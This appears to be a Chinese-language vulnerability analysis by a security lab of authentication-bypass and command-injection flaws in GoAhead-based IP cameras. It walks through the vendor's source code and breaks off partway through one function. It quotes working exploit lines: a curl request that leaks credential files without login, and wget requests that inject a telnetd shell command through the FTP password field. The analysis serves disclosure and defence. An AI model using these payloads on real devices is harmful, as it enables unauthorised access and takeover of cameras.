PDF 版本下载：[抓住“新代码”的影子 ——
基于GoAhead系列网络摄像头多个漏洞分析](http://paper.seebug.org/papers/Archive/%E6%8A%93%E4%BD%8F%E2%80%9D%E6%96%B0%E4%BB%A3%E7%A0%81%E2%80%9D%E7%9A%84%E5%BD%B1%E5%AD%90%E2%80%94%E2%80%94%E5%9F%BA%E4%BA%8EGoAhead%E7%B3%BB%E5%88%97%E7%BD%91%E7%BB%9C%E6%91%84%E5%83%8F%E5%A4%B4%E5%A4%9A%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.pdf)
Author： **知道创宇404实验室** Date：2017/03/19
## 一.漏洞背景
[GoAhead](https://embedthis.com/goahead/)作为世界上最受欢迎的嵌入式Web服务器被部署在数亿台设备中，是各种嵌入式设备与应用的理想选择。当然，各厂商也会根据不同产品需求对其进行一定程度的二次开发。
2017年3月7日，Seebug漏洞平台收录了一篇[基于GoAhead系列摄像头的多个漏洞](https://www.seebug.org/vuldb/ssvid-92748)。该漏洞为Pierre
Kim在博客上发表的一篇[文章](https://pierrekim.github.io/blog/2017-03-08-camera-goahead-0day.html)，披露了存在于1250多个摄像头型号的多个通用型漏洞。其在文章中将其中一个验证绕过漏洞归类为GoAhead服务器的漏洞，但事后证明，该漏洞却是由厂商二次开发GoAhead服务器产生的。于此同时，Pierre
Kim将其中两个漏洞组合使用，成功获取了摄像头的最高权限。
## 二.漏洞分析
>
> 当我们开始着手分析这些漏洞时发现GoAhead官方源码不存在该漏洞，解开的更新固件无法找到对应程序，一系列困难接踵而至。好在根据该漏洞特殊变量名称loginuse和loginpas，我们在github上找到一个上个月还在修改的[门铃项目](https://github.com/kuangxingyiqing/bell-> jpg)。抓着这个“新代码”的影子，我们不仅分析出了漏洞原理，还通过分析结果找到了漏洞新的利用方式。
>
> 由于该项目依赖的一些外部环境导致无法正常编译，我们仅仅通过静态代码分析得出结论，因此难免有所疏漏。如有错误，欢迎指正。:)
### 1.验证绕过导致的信息（登录凭据）泄漏漏洞
    作者给出POC: curl http://ip:port/system.ini?loginuse&loginpas
根据作者给出的POC，我们进行了如下测试:
可以看出，只要`url`中含有`loginuse`和`loginpas`这两个值即无需验证。甚至当这两个值对应的账号密码为空或者为错误的`zzzzzzzzzzzzzz`时均可通过验证。
看到这里，我们大致可以判断出验证`loginuse`和`loginpas`的逻辑问题导致该漏洞的出现。于是，在此门铃项目中直接搜索`loginuse`定位到关键函数。
`/func/ieparam.c`第`6407-6485`行`AdjustUserPri`函数如下：
    unsigned char AdjustUserPri( char* url )
    {
        int     iRet;
        int     iRet1;
        unsigned char   byPri = 0;
        char        loginuse[32];
        char        loginpas[32];
        char        decoderbuf[128];
        char        temp2[128];
        memset( loginuse, 0x00, 32 );
        memset( loginpas, 0x00, 32 );
        memset( temp2, 0x00, 128 );
        iRet = GetStrParamValue( url, "loginuse", temp2, 31 );
    //判断是否存在loginuse值，并将获取到的值赋给temp2
        if ( iRet == 0x00 )
        {
            memset( decoderbuf, 0x00, 128 );
            URLDecode( temp2, strlen( temp2 ), decoderbuf, 15 );
            memset( loginuse, 0x00, 31 );
            strcpy( loginuse, decoderbuf );
        }
    //如果存在，则将temp2复制到loginuse数组中
        memset( temp2, 0x00, 128 );
        iRet1 = GetStrParamValue( url, "loginpas", temp2, 31 );
    //判断是否存在loginpas值，并将获取到的值赋给temp2
        if ( iRet1 == 0x00 )
        {
            memset( decoderbuf, 0x00, 128 );
            URLDecode( temp2, strlen( temp2 ), decoderbuf, 15 );
            memset( loginpas, 0x00, 31 );
            strcpy( loginpas, decoderbuf );
        }
    //如果存在，则将temp2复制到loginpas数组中
        if ( iRet == 0 )
        {
            if ( iRet1 == 0x00 )
            {
                //printf("user %s pwd:%s\n",loginuse,loginpas);
                byPri = GetUserPri( loginuse, loginpas );
    //如果两次都获取到了对应的值，则通过GetUserPri进行验证。
                return byPri;
            }
        }
        memset( loginuse, 0x00, 32 );
        memset( loginpas, 0x00, 32 );
        memset( temp2, 0x00, 128 );
        iRet = GetStrParamValue( url, "user", temp2, 31 );
        if ( iRet == 0x00 )
        {
            memset( decoderbuf, 0x00, 128 );
            URLDecode( temp2, strlen( temp2 ), decoderbuf, 15 );
            memset( loginuse, 0x00, 31 );
            strcpy( loginuse, decoderbuf );
        }
        memset( temp2, 0x00, 128 );
        iRet1 = GetStrParamValue( url, "pwd", temp2, 31 );
        if ( iRet1 == 0x00 )
        {
            memset( decoderbuf, 0x00, 128 );
            URLDecode( temp2, strlen( temp2 ), decoderbuf, 15 );
            memset( loginpas, 0x00, 31 );
            strcpy( loginpas, decoderbuf );
        }
        if ( iRet == 0 )
        {
            if ( iRet1 == 0x00 )
            {
                //printf("user %s pwd:%s\n",loginuse,loginpas);
                byPri = GetUserPri( loginuse, loginpas );
                return byPri;
            }
        }
    //获取user和pwd参数，逻辑结构与上方的loginuse和loginpas相同。
        return byPri;
    }
我们对其中步骤做了注释，根据这段逻辑，我们先通过`GetStrParamValue()`获取`loginuse`和`loginpas`对应值，然后将获取值通过`GetUserPri()`函数进行验证。跟进`GetStrParamValue()`这个函数，我们发现了更奇怪的事情。
`command/cmd_thread.c`中第`13-51`行`GetStrParamValue()`函数如下：
    //结合上面代码中的iRet = GetStrParamValue( url, "loginuse", temp2, 31 );审视这段代码
    int GetStrParamValue( const char* pszSrc, const char* pszParamName, char* pszParamValue )
    {
        const char* pos1, *pos = pszSrc;
        unsigned char       len = 0;
        if ( !pszSrc || !pszParamName )
        {
            return -1;
        }
    //判断url和需要查找的变量loginuse是否存在
        pos1 = strstr( pos, pszParamName );
        if ( !pos1 )
        {
            return -1;
        }
    //由于url中含有loginuse，所以这里pos1可以取到对应的值，故不进入if(!pos1)
        pos = pos1 + strlen( pszParamName ) + 1;
        pos1 = strstr( pos, "&" );
        if ( pos1 )
        {
            memcpy( pszParamValue, pos, pos1 - pos );
    //根据正常情况loginuse=admin&loginpas=xxx,这一段代码的逻辑是从loginuse后一位也就是等于号开始取值直到&号作为loginuse对应的值。
    //根据作者的POC:loginuse&loginpas，最终这里pos应该位于pos1后一位，所以pos1-pos = -1
    //memcpy( pszParamValue, pos, -1 );无法运行成功。
            len = pos1 - pos;
        }
        else
        {
            pos1 = strstr( pos, " " );
            if ( pos1 != NULL )
            {
                memcpy( pszParamValue, pos, pos1 - pos );
                len = pos1 - pos;
            }
        }
        return 0;
    //不论上述到底如何取值，最终都可以返回0
    }
根据作者给出的`POC`，在`memcpy()`函数处会导致崩溃，但事实上，我们的`web`服务器正常运行并返回`system.ini`具体内容。这一点令我们百思不得其解。当我们对`AdjustUserPri()`函数向上溯源时终于弄清楚是上层代码问题导致代码根本无法运行到这里，所以也不会导致崩溃。
`func/ieparam.c`文件第`7514-7543`行调用了`AdjustUserPri()`函数:
    if ( auth == 0x00 )
    {
        char temp[512];
        int  wlen = 0;
        if ( len )
        {
            return 0;
        }
        #if 0
        byPri = AdjustUserPri( url );
        printf("url:%s byPri %d\n",url,byPri);
        if ( byPri == 0x00 )
        {
            memset( temp, 0x00, 512 );
            wlen += sprintf( temp + wlen, "var result=\"Auth Failed\";\r\n" );
            memcpy( pbuf, temp, wlen );
            return wlen;
        }
        #else
        byPri = 255;
        #endif
    }
    else
    {
        byPri = pri;
    }
在之前跟`GetUserPri()`函数时有一行注释：`//result:0->error user or passwd error 1->vistor
2->opration
255->admin`。当我们回头再看这段函数时，可以发现开发者直接将验证部分注释掉，`byPri`被直接赋值为`255`，这就意味着只要进入这段逻辑，用户权限就直接是管理员了。这里已经可以解释本小节开篇进行的测试了，也就是为什么我们输入空的用户名和密码或者错误的用户名和密码也可以通过验证。
很遗憾，我们没有继续向上溯源找到这里的`auth`这个值到底是如何而来。不过根据这里的代码逻辑，我们可以猜测，当`auth`为`0`时，通过`GET请求中的参数`验证用户名密码。当`auth`不为`0`时，通过`HTTP摘要验证方式`来验证用户名密码。
再看一遍上方代码，`GET`请求中含有参数`loginuse`和`loginpas`就直接可以通过验证。那么`AdjustUserPri()`函数中另外两个具有相同逻辑的参数`user`和`pwd`呢?
**成功抓住"新代码"的影子**
### 2.远程命令执行漏洞一（需登录）
作者给出的exp如下:
    user@kali$ wget -qO- 'http://192.168.1.107/set_ftp.cgi?next_url=ftp.htm&loginuse=admin&loginpas=admin&svr=192.168.1.1&port=21&user=ftp&pwd=$(telnetd -p25 -l/bin/sh)&dir=/&mode=PORT&upload_interval=0'
    user@kali$ wget -qO- 'http://192.168.1.107/ftptest.cgi?next_url=test_ftp.htm&loginuse=admin&loginpas=admin'
可以看到，该`exp`分为两步，第一步先设置`ftp`各种参数，第二步按照第一步设置的各参数测试`ftp`链接，同时导致我们在第一步设置的命令被执行。
我们在`func/ieparam.c`文件中找到了`set_ftp.cgi`和`ftptest.cgi`的调用过程
    383:    pdst = strstr( pcmd, "ftptest.cgi" );
    384:
    385:    if ( pdst != NULL )
    386:    {
    387:        return CGI_IESET_FTPTEST;
    388:    }
    455:    pdst = strstr( pcmd, "set_ftp.cgi" );
    456:
    457:    if ( pdst != NULL )
    458:    {
    459:        return CGI_IESET_FTP;
    460:    }
    7658:   case CGI_IESET_FTPTEST:
    7659:       if ( len == 0x00 )
    7660:       {
    7661:           iRet = cgisetftptest( pbuf, pparam, byPri );
    7662:       }
    7756:   case CGI_IESET_FTP:
    7757:       if ( len == 0x00 )
    7758:       {
    7759:           iRet = cgisetftp( pbuf, pparam, byPri );
    7760:           NoteSaveSem();
    7761:       }
首先跟踪`cgisetftp( pbuf, pparam, byPri
);`这个函数，我们发现，该函数仅仅是获取到我们请求的参数并将参数赋值给结构体中的各个变量。关键代码如下:
    //这部分代码可以不做细看，下一步我们进行ftp测试连接的时候对照该部分寻找对应的值就可以了。
        iRet = GetStrParamValue( pparam, "svr", temp2, 63 );
        URLDecode( temp2, strlen( temp2 ), decoderbuf, 63 );
        strcpy( bparam.stFtpParam.szFtpSvr, decoderbuf );
        GetIntParamValue( pparam, "port", &iValue );
        bparam.stFtpParam.nFtpPort = iValue;
        iRet = GetStrParamValue( pparam, "user", temp2, 31 );
        URLDecode( temp2, strlen( temp2 ), decoderbuf, 31 );
        strcpy( bparam.stFtpParam.szFtpUser, decoderbuf );
        memset( temp2, 0x00, 64 );
        iRet = GetStrParamValue( pparam, "pwd", temp2, 31 );
        URLDecode( temp2, strlen( temp2 ), decoderbuf, 31 );
        strcpy( bparam.stFtpParam.szFtpPwd, decoderbuf );
    //我们构造的命名被赋值给了参数bparam.stFtpParam.szFtpPwd
        iRet = GetStrParamValue( pparam, "dir", temp2, 31 );
        URLDecode( temp2, strlen( temp2 ), decoderbuf, 31 );
        strcpy( bparam.stFtpParam.szFtpDir, decoderbuf );
        if(decoderbuf[0] == 0)
        {
            strcpy(bparam.stFtpParam.szFtpDir, "/" );
        }
        GetIntParamValue( pparam, "mode", &iValue );
        bparam.stFtpParam.byMode = iValue;
        GetIntParamValue( pparam, "upload_interval", &iValue );
        bparam.stFtpParam.nInterTime = iValue;
        iRet = GetStrParamValue( pparam, "filename", temp1, 63 );
        URLDecode( temp2, strlen( temp2 ), decoderbuf, 63 );
        strcpy( bparam.stFtpParam.szFileName, decoderbuf );
综上所述，`set_ftp.cgi`仅仅是将我们请求的各参数写入全局变量中。 接下来是`ftptest.cgi`部分，也就是调用了`iRet =
cgisetftptest( pbuf, pparam, byPri
);`这个函数。在该函数中，最为关键的函数为`DoFtpTest();`。直接跳到`func/ftp.c`文件中找到函数`DoFtpTest()`：
    int DoFtpTest( void )
    {
        int     iRet = 0;
        iRet = FtpConfig( 0x01, NULL );
        if ( iRet == 0 )
        {
            char cmd[128];
            memset(cmd, 0, 128);
            sprintf(cmd, "/tmp/ftpupdate1.sh > %s", FILE_FTP_TEST_RESULT);
            iRet = DoSystem(cmd);
            //iRet = DoSystem( "/tmp/ftpupdate1.sh > /tmp/ftpret.txt" );
        }
        return iRet;
    }
可以看到，执行 FtpConfig()函数后运行了/tmp/ftpupdate1.sh。先让我们看看 FtpConfig()函数如何 处理该问题：
    int FtpConfig( char test, char* filename )
    {